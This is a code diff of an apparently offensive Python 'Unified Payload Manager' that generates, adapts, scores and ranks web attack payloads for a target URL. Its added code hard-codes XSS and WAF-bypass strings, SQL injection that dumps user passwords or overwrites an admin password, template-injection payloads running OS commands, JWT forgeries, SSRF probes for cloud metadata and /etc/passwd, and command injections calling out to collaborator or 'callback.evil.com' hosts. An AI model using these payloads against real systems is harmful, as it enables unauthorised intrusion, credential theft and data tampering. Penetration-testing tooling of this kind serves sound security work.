@@ -1,18 +1,25 @@
 """
-Payload Manager Module
-======================
-Intelligently selects and ranks payloads based on target fingerprint
+Unified Payload Manager
+========================
+Combines payload generation, adaptation, scoring, and selection into a single module.
+Merges functionality from enhanced_payload_manager.py, payload_manager.py, and advanced_payload_plugin.py
 """
 
 import re
+import base64
 import json
+import random
+import string
+import urllib.parse
+import numpy as np
 from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass, field
+from datetime import datetime
+from urllib.parse import urlparse, urljoin
 from packaging import version
 from packaging.specifiers import SpecifierSet
-import numpy as np
-from datetime import datetime
 
+# Import only what we need from vulnerability_kb and fingerprinter
 from .vulnerability_kb import (
     VulnerabilityKnowledgeBase,
     VulnPayload,
@@ -20,16 +27,41 @@ from .vulnerability_kb import (
 )
 from .fingerprinter import TargetFingerprint
 
+# ============================================================================
+# DATA CLASSES
+# ============================================================================
+
+@dataclass
+class PayloadContext:
+    """Context information for payload adaptation"""
+    target_url: str
+    parameter_name: Optional[str] = None
+    injection_context: str = "parameter"  # parameter, header, path, body
+    quote_context: str = "none"  # single, double, none
+    database_type: Optional[str] = None
+    encoding_required: List[str] = None
+    waf_detected: Optional[str] = None
+    
+    # Attacker infrastructure
+    attacker_domain: Optional[str] = None
+    collaborator_url: Optional[str] = None
+    callback_host: Optional[str] = None
+    
+    # Target specifics
+    object_id: Optional[str] = None
+    user_id: Optional[str] = None
+    session_token: Optional[str] = None
+
 @dataclass
 class PayloadScore:
     """Scoring components for payload ranking"""
-    version_match: float = 0.0  # Product/version compatibility
-    pattern_match: float = 0.0  # Detection pattern match
-    confidence_base: float = 0.0  # Base confidence from KB
-    tag_match: float = 0.0  # Tag relevance
-    context_match: float = 0.0  # Context appropriateness
-    historical_success: float = 0.0  # Past success rate
-    total: float = 0.0  # Weighted total
+    version_match: float = 0.0
+    pattern_match: float = 0.0
+    confidence_base: float = 0.0
+    tag_match: float = 0.0
+    context_match: float = 0.0
+    historical_success: float = 0.0
+    total: float = 0.0
     
     def calculate_total(self, weights: Dict[str, float]) -> float:
         """Calculate weighted total score"""
@@ -46,569 +78,670 @@ class PayloadScore:
 @dataclass
 class RankedPayload:
     """Payload with ranking information"""
-    payload: VulnPayload
-    score: PayloadScore
-    rank: int
+    payload: str  # The actual payload string
+    metadata: Optional[VulnPayload] = None  # KB metadata if available
+    score: PayloadScore = field(default_factory=PayloadScore)
+    rank: int = 0
     reasoning: List[str] = field(default_factory=list)
+    category: str = ""
+    name: str = ""
+
+# ============================================================================
+# PAYLOAD GENERATOR (from advanced_payload_plugin.py)
+# ============================================================================
+
+class PayloadGenerator:
+    """Generates fresh payloads for different vulnerability types"""
     
-class PayloadManager:
-    """Manages payload selection and ranking"""
-    
-    def __init__(self, kb: Optional[VulnerabilityKnowledgeBase] = None,
-                 config: Optional[Dict] = None):
-        self.kb = kb or VulnerabilityKnowledgeBase()
-        self.config = config or self._default_config()
-        self.history = {}  # Track success rates
-        self.cache = {}  # Cache selection results
+    def generate(self, vuln_type: str, target_info: Dict = None) -> List[Dict]:
+        """Generate payloads based on vulnerability type"""
+        vuln_type_lower = vuln_type.lower()
+        target_info = target_info or {}
         
-    def _default_config(self) -> Dict:
-        """Default configuration for payload selection"""
-        return {
-            'weights': {
-                'version': 0.35,  # Product/version match weight
-                'pattern': 0.25,  # Detection pattern weight
-                'confidence': 0.20,  # Base confidence weight
-                'tag': 0.10,  # Tag match weight
-                'context': 0.05,  # Context match weight
-                'history': 0.05  # Historical success weight
+        if 'xss' in vuln_type_lower:
+            payloads = self._generate_xss_payloads(target_info)
+        elif 'sqli' in vuln_type_lower or 'sql' in vuln_type_lower:
+            payloads = self._generate_sqli_payloads(target_info)
+        elif 'ssti' in vuln_type_lower:
+            payloads = self._generate_ssti_payloads(target_info)
+        elif 'jwt' in vuln_type_lower:
+            payloads = self._generate_jwt_payloads(target_info)
+        elif 'ssrf' in vuln_type_lower:
+            payloads = self._generate_ssrf_payloads(target_info)
+        elif 'rce' in vuln_type_lower or 'command' in vuln_type_lower:
+            payloads = self._generate_rce_payloads(target_info)
+        elif 'idor' in vuln_type_lower:
+            payloads = self._generate_idor_payloads(target_info)
+        else:
+            payloads = []
+        
+        # Convert to dict format
+        return [
+            {
+                'payload': p,
+                'category': vuln_type,
+                'name': f'generated_{vuln_type}_{i}',
+                'confidence': 0.6  # Generated payloads have moderate confidence
+            }
+            for i, p in enumerate(payloads)
+        ]
+    
+    def _generate_xss_payloads(self, target_info: Dict) -> List[str]:
+        """Generate advanced XSS payloads"""
+        base_payloads = [
+            # HTML entity encoding
+            "&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;",
+            # Unicode encoding
+            "\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0058\\u0053\\u0053\\u0027\\u0029",
+            # Event handlers
+            'onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))',
+            # Template literals
+            "onerror=eval`String.fromCharCode(97,108,101,114,116,96,88,83,83,96)`",
+            # DOM breaking
+            '"><svg/onload=alert(`XSS`)>',
+            # WAF bypass
+            "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
+            # Polyglot
+            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+        ]
+        
+        # Context-aware encoding
+        context = target_info.get('context', 'html')
+        encoded_payloads = []
+        
+        for payload in base_payloads:
+            if context == 'url':
+                encoded_payloads.append(urllib.parse.quote(payload))
+            elif context == 'double_quoted':
+                encoded_payloads.append(payload.replace('"', '\\"'))
+            else:
+                encoded_payloads.append(payload)
+        
+        return base_payloads + encoded_payloads
+    
+    def _generate_sqli_payloads(self, target_info: Dict) -> List[str]:
+        """Generate SQL injection payloads"""
+        return [
+            # Boolean-based blind
+            "' OR '1'='1",
+            "' OR (SELECT '1' FROM users WHERE username='admin' AND LENGTH(password)>10)='1",
+            # Time-based blind
+            "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
+            "' AND SLEEP(5)--",
+            # Union-based
+            "' UNION SELECT NULL,username,password FROM users--",
+            # Error-based
+            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            # Second-order
+            "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
+            # NoSQL
+            "' || '1'=='1",
+            # PostgreSQL
+            "'; SELECT pg_sleep(5)--",
+            # MSSQL
+            "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
+        ]
+    
+    def _generate_ssti_payloads(self, target_info: Dict) -> List[str]:
+        """Generate SSTI payloads"""
+        return [
+            # Jinja2
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
+            # Django
+            "{% load os %}{{ os.system('id') }}",
+            # Smarty
+            "{php}echo `id`;{/php}",
+            # Freemarker
+            "${'freemarker.template.utility.Execute'?new()('id')}",
+            # Detection
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>"
+        ]
+    
+    def _generate_jwt_payloads(self, target_info: Dict) -> List[str]:
+        """Generate JWT payloads"""
+        return [
+            '{"alg":"none","typ":"JWT"}',
+            '{"alg":"HS256","typ":"JWT"}',
+            '{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"1"}}',
+            '{"admin":true,"user":"admin"}',
+            '{"exp":9999999999,"user":"admin"}'
+        ]
+    
+    def _generate_ssrf_payloads(self, target_info: Dict) -> List[str]:
+        """Generate SSRF payloads"""
+        return [
+            "http://169.254.169.254/latest/meta-data/",
+            "file:///etc/passwd",
+            "gopher://127.0.0.1:6379/_SET%20key%20value",
+            "dict://127.0.0.1:11211/stats",
+            "http://localhost:8080/admin",
+            "http://COLLABORATOR_URL"
+        ]
+    
+    def _generate_rce_payloads(self, target_info: Dict) -> List[str]:
+        """Generate RCE payloads"""
+        return [
+            "; nslookup COLLABORATOR_URL",
+            "& ping -c 1 COLLABORATOR_URL",
+            "| curl COLLABORATOR_URL",
+            "`nslookup COLLABORATOR_URL`",
+            "$(nslookup COLLABORATOR_URL)",
+            "'; exec('nslookup COLLABORATOR_URL');",
+        ]
+    
+    def _generate_idor_payloads(self, target_info: Dict) -> List[str]:
+        """Generate IDOR payloads"""
+        return [
+            "../users/admin",
+            "../../admin/panel",
+            "0",
+            "99999",
+            "-1",
+            "admin",
+            "1' OR '1'='1"
+        ]
+
+# ============================================================================
+# PAYLOAD ADAPTER (from enhanced_payload_manager.py)
+# ============================================================================
+
+class PayloadAdapter:
+    """Adapts generic payloads to specific target contexts"""
+    
+    def __init__(self):
+        self.global_replacements = {
+            'ATTACKER_DOMAIN': 'attacker_domain',
+            'COLLABORATOR_URL': 'collaborator_url',
+            'CALLBACK_HOST': 'callback_host',
+            'TARGET_HOST': 'target_host',
+            'TARGET_ORIGIN': 'target_origin',
+            'TARGET_PATH': 'target_path',
+            'PARAM': 'parameter_name',
+            'ID': 'object_id',
+            'OBJECT_ID': 'object_id',
+            'USER_ID': 'user_id',
+            'CMD': 'command'
+        }
+        
+        self.db_adaptations = {
+            'mysql': {
+                'sleep_function': 'SLEEP(5)',
+                'version_function': '@@version',
+                'comment_syntax': '-- ',
+                'concat_function': 'CONCAT'
             },
-            'min_score': 0.3,  # Minimum score to include payload
-            'prefer_version_specific': True,  # Prioritize version-specific payloads
-            'enable_caching': True,
-            'cache_ttl': 300  # 5 minutes
+            'postgresql': {
+                'sleep_function': 'pg_sleep(5)',
+                'version_function': 'version()',
+                'comment_syntax': '-- ',
+                'concat_function': '||'
+            },
+            'mssql': {
+                'sleep_function': "WAITFOR DELAY '0:0:5'",
+                'version_function': '@@version',
+                'comment_syntax': '-- ',
+                'concat_function': '+'
+            }
         }
     
-    def select_payloads(self,
-                       fingerprint: TargetFingerprint,
-                       vulnerability: VulnCategory,
-                       context: Optional[Dict] = None,
-                       top_n: int = 5) -> List[RankedPayload]:
-        """
-        Select and rank payloads based on fingerprint and context
+    def adapt_payload(self, payload: str, context: PayloadContext, 
+                     fingerprint: Optional[TargetFingerprint] = None) -> str:
+        """Adapt a generic payload to specific target context"""
+        adapted = payload
         
-        Args:
-            fingerprint: Target fingerprint with product/version info
-            vulnerability: Vulnerability category to test
-            context: Additional context (endpoint type, parameters, etc.)
-            top_n: Number of top payloads to return
-            
-        Returns:
-            List of ranked payloads
-        """
-        # Check cache
-        cache_key = self._get_cache_key(fingerprint, vulnerability, context)
-        if self.config['enable_caching'] and cache_key in self.cache:
-            cached = self.cache[cache_key]
-            if (datetime.now() - cached['timestamp']).seconds < self.config['cache_ttl']:
-                return cached['payloads'][:top_n]
+        # Extract target information
+        parsed_url = urlparse(context.target_url)
+        target_host = parsed_url.netloc
+        target_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
+        target_path = parsed_url.path or "/"
         
-        # Get all payloads for vulnerability category
-        all_payloads = self.kb.get_payloads_by_category(vulnerability)
+        # Build replacements
+        replacements = {
+            'attacker_domain': context.attacker_domain or 'attacker.com',
+            'collaborator_url': context.collaborator_url or 'https://collab.oast.site',
+            'callback_host': context.callback_host or 'callback.evil.com',
+            'target_host': target_host,
+            'target_origin': target_origin,
+            'target_path': target_path,
+            'parameter_name': context.parameter_name or 'id',
+            'object_id': context.object_id or '1',
+            'user_id': context.user_id or '1',
+            'command': 'nslookup ' + (context.collaborator_url or 'test.oast.site')
+        }
         
-        # Score and rank payloads
-        ranked_payloads = []
-        for payload in all_payloads:
-            score = self._score_payload(payload, fingerprint, context)
-            
-            # Skip low-scoring payloads
-            if score.total < self.config['min_score']:
-                continue
-            
-            reasoning = self._generate_reasoning(payload, score, fingerprint)
-            
-            ranked_payloads.append(RankedPayload(
-                payload=payload,
-                score=score,
-                rank=0,  # Will be set after sorting
-                reasoning=reasoning
-            ))
+        # Perform replacements
+        for placeholder, context_key in self.global_replacements.items():
+            if placeholder in adapted and context_key in replacements:
+                adapted = adapted.replace(placeholder, str(replacements[context_key]))
         
-        # Sort by score
-        ranked_payloads.sort(key=lambda x: x.score.total, reverse=True)
+        # Handle vulnerability-specific adaptations
+        adapted = self._adapt_by_vulnerability_type(adapted, context, fingerprint)
         
-        # Assign ranks
-        for i, rp in enumerate(ranked_payloads):
-            rp.rank = i + 1
+        # Apply encoding if required
+        if context.encoding_required:
+            adapted = self._apply_encoding(adapted, context.encoding_required)
         
-        # Cache results
-        if self.config['enable_caching']:
-            self.cache[cache_key] = {
-                'timestamp': datetime.now(),
-                'payloads': ranked_payloads
-            }
+        # Handle WAF evasion if detected
+        if context.waf_detected:
+            adapted = self._apply_waf_evasion(adapted, context.waf_detected)
         
-        return ranked_payloads[:top_n]
+        return adapted
     
-    def _score_payload(self,
-                      payload: VulnPayload,
-                      fingerprint: TargetFingerprint,
-                      context: Optional[Dict]) -> PayloadScore:
-        """Score a payload based on various factors"""
+    def _adapt_by_vulnerability_type(self, payload: str, context: PayloadContext,
+                                   fingerprint: Optional[TargetFingerprint]) -> str:
+        """Apply vulnerability-specific adaptations"""
+        vuln_type = self._detect_vuln_type(payload)
+        
+        if vuln_type == 'SQLI':
+            return self._adapt_sqli_payload(payload, context, fingerprint)
+        elif vuln_type == 'XSS':
+            return self._adapt_xss_payload(payload, context, fingerprint)
+        
+        return payload
+    
+    def _detect_vuln_type(self, payload: str) -> str:
+        """Detect vulnerability type from payload"""
+        payload_lower = payload.lower()
+        
+        if any(x in payload_lower for x in ['union', 'select', 'sleep(', 'waitfor']):
+            return 'SQLI'
+        elif any(x in payload_lower for x in ['<script', 'onerror', 'onload', 'alert(']):
+            return 'XSS'
+        elif any(x in payload_lower for x in ['http://', 'gopher://', 'file://']):
+            return 'SSRF'
+        elif any(x in payload_lower for x in ['&&', ';', '`', '$(']):
+            return 'RCE'
+        
+        return 'UNKNOWN'
+    
+    def _adapt_sqli_payload(self, payload: str, context: PayloadContext,
+                           fingerprint: Optional[TargetFingerprint]) -> str:
+        """Adapt SQL injection payloads"""
+        adapted = payload
+        
+        # Determine database type
+        db_type = context.database_type or 'mysql'
+        
+        if db_type in self.db_adaptations:
+            db_config = self.db_adaptations[db_type]
+            adapted = re.sub(r'SLEEP\(\d+\)', db_config['sleep_function'], adapted)
+            adapted = re.sub(r'@@version', db_config['version_function'], adapted)
+        
+        # Handle quote context
+        if context.quote_context == 'single':
+            adapted = adapted.replace("'", "\\'")
+        elif context.quote_context == 'double':
+            adapted = adapted.replace('"', '\\"').replace("'", '"')
+        
+        return adapted
+    
+    def _adapt_xss_payload(self, payload: str, context: PayloadContext,
+                          fingerprint: Optional[TargetFingerprint]) -> str:
+        """Adapt XSS payloads"""
+        adapted = payload
+        
+        if context.attacker_domain:
+            adapted = re.sub(r'https?://[^/\s"\']+', context.attacker_domain, adapted)
+        
+        if context.injection_context == 'attribute':
+            if context.quote_context == 'single':
+                adapted = f"' {adapted} '"
+            elif context.quote_context == 'double':
+                adapted = f'" {adapted} "'
+        
+        return adapted
+    
+    def _apply_encoding(self, payload: str, encodings: List[str]) -> str:
+        """Apply encoding layers"""
+        encoded = payload
+        
+        for encoding in encodings:
+            if encoding == 'url':
+                encoded = urllib.parse.quote(encoded)
+            elif encoding == 'base64':
+                encoded = base64.b64encode(encoded.encode()).decode()
+            elif encoding == 'html':
+                encoded = ''.join(f'&#{ord(c)};' for c in encoded)
+        
+        return encoded
+    
+    def _apply_waf_evasion(self, payload: str, waf_type: str) -> str:
+        """Apply WAF-specific evasion"""
+        if waf_type.lower() == 'cloudflare':
+            payload = self._random_case(payload)
+        return payload
+    
+    def _random_case(self, text: str) -> str:
+        """Randomize case for evasion"""
+        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
+
+# ============================================================================
+# PAYLOAD SCORER (from payload_manager.py)
+# ============================================================================
+
+class PayloadScorer:
+    """Scores and ranks payloads"""
+    
+    def __init__(self, config: Optional[Dict] = None):
+        self.config = config or self._default_config()
+        self.history = {}
+    
+    def _default_config(self) -> Dict:
+        return {
+            'weights': {
+                'version': 0.35,
+                'pattern': 0.25,
+                'confidence': 0.20,
+                'tag': 0.10,
+                'context': 0.05,
+                'history': 0.05
+            },
+            'min_score': 0.3
+        }
+    
+    def score_payload(self, payload: Dict, fingerprint: TargetFingerprint,
+                     context: Optional[Dict]) -> PayloadScore:
+        """Score a single payload"""
         score = PayloadScore()
         
-        # 1. Version match scoring
-        score.version_match = self._score_version_match(payload, fingerprint)
+        # Version match
+        if 'product' in payload:
+            score.version_match = self._score_version_match(payload, fingerprint)
+        else:
+            score.version_match = 0.5
         
-        # 2. Pattern match scoring (against previous responses if available)
-        score.pattern_match = self._score_pattern_match(payload, context)
+        # Confidence base
+        score.confidence_base = payload.get('confidence', 0.5)
         
-        # 3. Base confidence from KB
-        score.confidence_base = payload.confidence_score
-        
-        # 4. Tag match scoring
-        score.tag_match = self._score_tag_match(payload, fingerprint, context)
-        
-        # 5. Context match scoring
+        # Context match
         score.context_match = self._score_context_match(payload, context)
         
-        # 6. Historical success rate
-        score.historical_success = self._get_historical_success(payload)
+        # Historical success
+        payload_id = payload.get('name', str(hash(payload['payload'])))
+        score.historical_success = self._get_historical_success(payload_id)
         
-        # Calculate weighted total
+        # Calculate total
         score.calculate_total(self.config['weights'])
         
         return score
     
-    def _score_version_match(self,
-                            payload: VulnPayload,
-                            fingerprint: TargetFingerprint) -> float:
-        """Score how well payload matches target version"""
-        # No product/version requirements - universal payload
-        if not payload.product and not payload.version_spec:
-            return 0.5  # Neutral score for universal payloads
+    def _score_version_match(self, payload: Dict, fingerprint: TargetFingerprint) -> float:
+        """Score version compatibility"""
+        payload_product = payload.get('product', '').lower()
         
-        # Product mismatch
-        if payload.product and fingerprint.product:
-            if payload.product.lower() != fingerprint.product.lower():
-                # Check if product is in technologies list
-                tech_match = any(
-                    payload.product.lower() in tech.lower()
-                    for tech in fingerprint.technologies
-                )
-                if not tech_match:
-                    return 0.0  # Complete mismatch
-        
-        # Product matches, check version
-        if payload.version_spec and fingerprint.version:
-            try:
-                if payload.matches_version(fingerprint.version):
-                    return 1.0  # Perfect version match
-                else:
-                    return 0.2  # Product matches but version doesn't
-            except:
-                return 0.5  # Can't determine version match
-        
-        # Product matches but no version info
-        if payload.product and fingerprint.product:
-            if payload.product.lower() == fingerprint.product.lower():
-                return 0.8  # Good product match
-        
-        return 0.5  # Default neutral score
-    
-    def _score_pattern_match(self,
-                            payload: VulnPayload,
-                            context: Optional[Dict]) -> float:
-        """Score based on detection pattern relevance"""
-        if not payload.detection_pattern or not context:
+        if not payload_product:
             return 0.5
         
-        # Check if we have previous response data
-        prev_responses = context.get('previous_responses', [])
-        if not prev_responses:
-            return 0.5
+        if fingerprint.product and payload_product == fingerprint.product.lower():
+            return 1.0
         
-        # Check if pattern would match previous responses
-        pattern_score = 0.0
-        for response in prev_responses:
-            response_text = response.get('text', '')
-            if response_text:
-                try:
-                    if re.search(payload.detection_pattern, response_text):
-                        pattern_score = 1.0
-                        break
-                except:
-                    pass
+        if any(payload_product in tech.lower() for tech in fingerprint.technologies):
+            return 0.7
         
-        return pattern_score
+        return 0.2
     
-    def _score_tag_match(self,
-                        payload: VulnPayload,
-                        fingerprint: TargetFingerprint,
-                        context: Optional[Dict]) -> float:
-        """Score based on tag relevance"""
-        if not payload.tags:
-            return 0.5
-        
-        score = 0.0
-        matches = 0
-        
-        # Check tags against fingerprint
-        fingerprint_terms = []
-        if fingerprint.product:
-            fingerprint_terms.append(fingerprint.product.lower())
-        fingerprint_terms.extend([t.lower() for t in fingerprint.technologies])
-        fingerprint_terms.extend([f.lower() for f in fingerprint.frameworks])
-        if fingerprint.cms:
-            fingerprint_terms.append(fingerprint.cms.lower())
-        
-        for tag in payload.tags:
-            tag_lower = tag.lower()
-            if any(term in tag_lower for term in fingerprint_terms):
-                matches += 1
-        
-        if matches > 0:
-            score = min(1.0, matches / len(payload.tags))
-        
-        # Check tags against context
-        if context:
-            context_tags = context.get('tags', [])
-            for tag in payload.tags:
-                if tag in context_tags:
-                    score = min(1.0, score + 0.2)
-        
-        return score
-    
-    def _score_context_match(self,
-                            payload: VulnPayload,
-                            context: Optional[Dict]) -> float:
-        """Score based on context appropriateness"""
+    def _score_context_match(self, payload: Dict, context: Optional[Dict]) -> float:
+        """Score context appropriateness"""
         if not context:
             return 0.5
         
-        score = 0.5
-        
-        # Check injection context
         inj_context = context.get('injection_context', '')
-        if inj_context and payload.context:
-            if inj_context == payload.context:
-                score = 1.0
-            elif inj_context in ['any', 'unknown']:
-                score = 0.7
+        payload_context = payload.get('context', '')
+        
+        if inj_context and payload_context:
+            if inj_context == payload_context:
+                return 1.0
             else:
-                score = 0.3
+                return 0.3
         
-        # Check endpoint type
-        endpoint_type = context.get('endpoint_type', '')
-        if endpoint_type:
-            if endpoint_type == 'api' and 'json' in payload.context:
-                score = min(1.0, score + 0.2)
-            elif endpoint_type == 'form' and 'parameter' in payload.context:
-                score = min(1.0, score + 0.2)
-        
-        return score
+        return 0.5
     
-    def _get_historical_success(self, payload: VulnPayload) -> float:
-        """Get historical success rate for payload"""
-        payload_id = f"{payload.category.value}_{payload.name}"
-        
+    def _get_historical_success(self, payload_id: str) -> float:
+        """Get historical success rate"""
         if payload_id in self.history:
             stats = self.history[payload_id]
             if stats['attempts'] > 0:
                 return stats['successes'] / stats['attempts']
-        
-        return 0.5  # No history, neutral score
+        return 0.5
     
-    def _generate_reasoning(self,
-                           payload: VulnPayload,
-                           score: PayloadScore,
-                           fingerprint: TargetFingerprint) -> List[str]:
+    def update_history(self, payload_id: str, success: bool):
+        """Update success history"""
+        if payload_id not in self.history:
+            self.history[payload_id] = {'attempts': 0, 'successes': 0}
+        
+        self.history[payload_id]['attempts'] += 1
+        if success:
+            self.history[payload_id]['successes'] += 1
+
+# ============================================================================
+# UNIFIED PAYLOAD MANAGER
+# ============================================================================
+
+class UnifiedPayloadManager:
+    """
+    Main payload manager that combines generation, adaptation, scoring, and selection
+    This is the primary interface that should be used by orchestrator.py
+    """
+    
+    def __init__(self, kb_path: Optional[str] = None, config: Optional[Dict] = None):
+        self.kb = VulnerabilityKnowledgeBase(kb_path) if kb_path else None
+        self.generator = PayloadGenerator()
+        self.adapter = PayloadAdapter()
+        self.scorer = PayloadScorer(config)
+        self.config = config or {}
+        self.cache = {}
+        self.fingerprint_cache = {}
+    
+    def get_payloads_for_target(self,
+                                target_url: str,
+                                vulnerability_type: str,
+                                fingerprint: Optional[TargetFingerprint] = None,
+                                context: Optional[PayloadContext] = None,
+                                top_n: int = 10,
+                                include_generated: bool = True) -> List[RankedPayload]:
+        """
+        Get top payloads for a target, combining KB and generated payloads
+        
+        Args:
+            target_url: Target URL
+            vulnerability_type: Type of vulnerability (XSS, SQLI, etc.)
+            fingerprint: Target fingerprint
+            context: Payload context for adaptation
+            top_n: Number of payloads to return
+            include_generated: Whether to include generated payloads
+            
+        Returns:
+            List of ranked payloads ready for use
+        """
+        all_payloads = []
+        
+        # Get KB payloads if available
+        if self.kb:
+            try:
+                vuln_category = VulnCategory[vulnerability_type.upper()]
+                kb_payloads = self.kb.get_payloads_by_category(vuln_category)
+                
+                # Convert to dict format
+                for kbp in kb_payloads:
+                    all_payloads.append({
+                        'payload': kbp.payload,
+                        'category': vulnerability_type,
+                        'name': kbp.name,
+                        'confidence': kbp.confidence_score,
+                        'product': kbp.product,
+                        'metadata': kbp
+                    })
+            except (KeyError, AttributeError):
+                pass
+        
+        # Generate fresh payloads if requested
+        if include_generated:
+            target_info = {'url': target_url}
+            if fingerprint:
+                target_info.update({
+                    'product': fingerprint.product,
+                    'version': fingerprint.version,
+                    'technologies': fingerprint.technologies
+                })
+            
+            generated = self.generator.generate(vulnerability_type, target_info)
+            all_payloads.extend(generated)
+        
+        # Create default context if not provided
+        if not context:
+            context = PayloadContext(target_url=target_url)
+        
+        # Adapt, score, and rank all payloads
+        ranked_payloads = []
+        
+        for payload_dict in all_payloads:
+            # Adapt payload to context
+            adapted = self.adapter.adapt_payload(
+                payload_dict['payload'],
+                context,
+                fingerprint
+            )
+            
+            # Score payload
+            score = self.scorer.score_payload(payload_dict, fingerprint or self._default_fingerprint(), {})
+            
+            # Generate reasoning
+            reasoning = self._generate_reasoning(payload_dict, score, fingerprint)
+            
+            # Create ranked payload
+            ranked = RankedPayload(
+                payload=adapted,
+                metadata=payload_dict.get('metadata'),
+                score=score,
+                rank=0,
+                reasoning=reasoning,
+                category=payload_dict.get('category', vulnerability_type),
+                name=payload_dict.get('name', 'unnamed')
+            )
+            
+            ranked_payloads.append(ranked)
+        
+        # Sort by score and assign ranks
+        ranked_payloads.sort(key=lambda x: x.score.total, reverse=True)
+        
+        for i, rp in enumerate(ranked_payloads[:top_n]):
+            rp.rank = i + 1
+        
+        return ranked_payloads[:top_n]
+    
+    def adapt_payload_to_context(self, payload: str, target_url: str,
+                                 context: Optional[PayloadContext] = None,
+                                 fingerprint: Optional[TargetFingerprint] = None) -> str:
+        """Adapt a single payload to context (convenience method)"""
+        if not context:
+            context = PayloadContext(target_url=target_url)
+        
+        return self.adapter.adapt_payload(payload, context, fingerprint)
+    
+    def update_payload_success(self, payload_name: str, success: bool):
+        """Update success history for a payload"""
+        self.scorer.update_history(payload_name, success)
+    
+    def _generate_reasoning(self, payload_dict: Dict, score: PayloadScore,
+                           fingerprint: Optional[TargetFingerprint]) -> List[str]:
         """Generate reasoning for payload selection"""
         reasons = []
         
         if score.version_match >= 0.8:
-            if payload.product and payload.version_spec:
-                reasons.append(f"Specifically designed for {payload.product} {payload.version_spec}")
-            elif payload.product:
-                reasons.append(f"Matches target product: {payload.product}")
+            if 'product' in payload_dict:
+                reasons.append(f"Matches target product: {payload_dict['product']}")
         
         if score.confidence_base >= 0.8:
-            reasons.append(f"High confidence payload ({score.confidence_base:.0%})")
-        
-        if score.pattern_match >= 0.8:
-            reasons.append("Detection pattern matches previous responses")
-        
-        if score.tag_match >= 0.7:
-            reasons.append("Tags match target technologies")
+            reasons.append(f"High confidence ({score.confidence_base:.0%})")
         
         if score.historical_success >= 0.7:
-            success_rate = score.historical_success * 100
-            reasons.append(f"Historical success rate: {success_rate:.0f}%")
+            reasons.append(f"Historical success rate: {score.historical_success:.0%}")
+        
+        if payload_dict.get('name', '').startswith('generated_'):
+            reasons.append("Dynamically generated for target")
         
         if not reasons:
             reasons.append("General purpose payload")
         
         return reasons
     
-    def _get_cache_key(self,
-                      fingerprint: TargetFingerprint,
-                      vulnerability: VulnCategory,
-                      context: Optional[Dict]) -> str:
-        """Generate cache key for selection results"""
-        key_parts = [
-            vulnerability.value,
-            fingerprint.product or 'unknown',
-            fingerprint.version or 'unknown'
-        ]
-        
-        if context:
-            key_parts.append(json.dumps(sorted(context.items()), sort_keys=True))
-        
-        return "|".join(key_parts)
+    def _default_fingerprint(self) -> TargetFingerprint:
+        """Create a default fingerprint when none provided"""
+        return TargetFingerprint(
+            url='',
+            product='unknown',
+            version='unknown',
+            technologies=[],
+            frameworks=[],
+            headers={}
+        )
     
-    def update_history(self,
-                      payload: VulnPayload,
-                      success: bool):
-        """Update historical success data for payload"""
-        payload_id = f"{payload.category.value}_{payload.name}"
-        
-        if payload_id not in self.history:
-            self.history[payload_id] = {
-                'attempts': 0,
-                'successes': 0
-            }
-        
-        self.history[payload_id]['attempts'] += 1
-        if success:
-            self.history[payload_id]['successes'] += 1
-    
-    def get_adaptive_payloads(self,
-                             fingerprint: TargetFingerprint,
-                             failed_payloads: List[VulnPayload],
-                             vulnerability: VulnCategory,
-                             context: Optional[Dict] = None) -> List[RankedPayload]:
-        """
-        Get adaptive payloads after initial failures
-        
-        Args:
-            fingerprint: Target fingerprint
-            failed_payloads: List of payloads that have failed
-            vulnerability: Vulnerability category
-            context: Additional context
-            
-        Returns:
-            List of alternative payloads to try
-        """
-        # Get all payloads
-        all_payloads = self.kb.get_payloads_by_category(vulnerability)
-        
-        # Filter out failed payloads
-        failed_names = {p.name for p in failed_payloads}
-        remaining = [p for p in all_payloads if p.name not in failed_names]
-        
-        # Analyze failure patterns
-        failure_analysis = self._analyze_failures(failed_payloads)
-        
-        # Adjust scoring weights based on failures
-        adapted_weights = self._adapt_weights(failure_analysis)
-        
-        # Score remaining payloads with adapted weights
-        ranked_payloads = []
-        for payload in remaining:
-            score = self._score_payload(payload, fingerprint, context)
-            score.calculate_total(adapted_weights)
-            
-            # Boost score if payload is different from failed patterns
-            if self._is_different_approach(payload, failed_payloads):
-                score.total *= 1.2
-            
-            reasoning = self._generate_reasoning(payload, score, fingerprint)
-            reasoning.append("Selected as alternative approach after failures")
-            
-            ranked_payloads.append(RankedPayload(
-                payload=payload,
-                score=score,
-                rank=0,
-                reasoning=reasoning
-            ))
-        
-        # Sort and rank
-        ranked_payloads.sort(key=lambda x: x.score.total, reverse=True)
-        for i, rp in enumerate(ranked_payloads):
-            rp.rank = i + 1
-        
-        return ranked_payloads[:5]
-    
-    def _analyze_failures(self, failed_payloads: List[VulnPayload]) -> Dict:
-        """Analyze patterns in failed payloads"""
-        analysis = {
-            'common_contexts': {},
-            'common_techniques': {},
-            'avg_length': 0,
-            'encoding_used': False
-        }
-        
-        # Analyze contexts
-        for p in failed_payloads:
-            context = p.context or 'unknown'
-            analysis['common_contexts'][context] = \
-                analysis['common_contexts'].get(context, 0) + 1
-        
-        # Analyze payload characteristics
-        lengths = [len(p.payload) for p in failed_payloads]
-        if lengths:
-            analysis['avg_length'] = np.mean(lengths)
-        
-        # Check for encoding
-        for p in failed_payloads:
-            if any(enc in p.payload for enc in ['%', '&#', '\\x', '\\u']):
-                analysis['encoding_used'] = True
-                break
-        
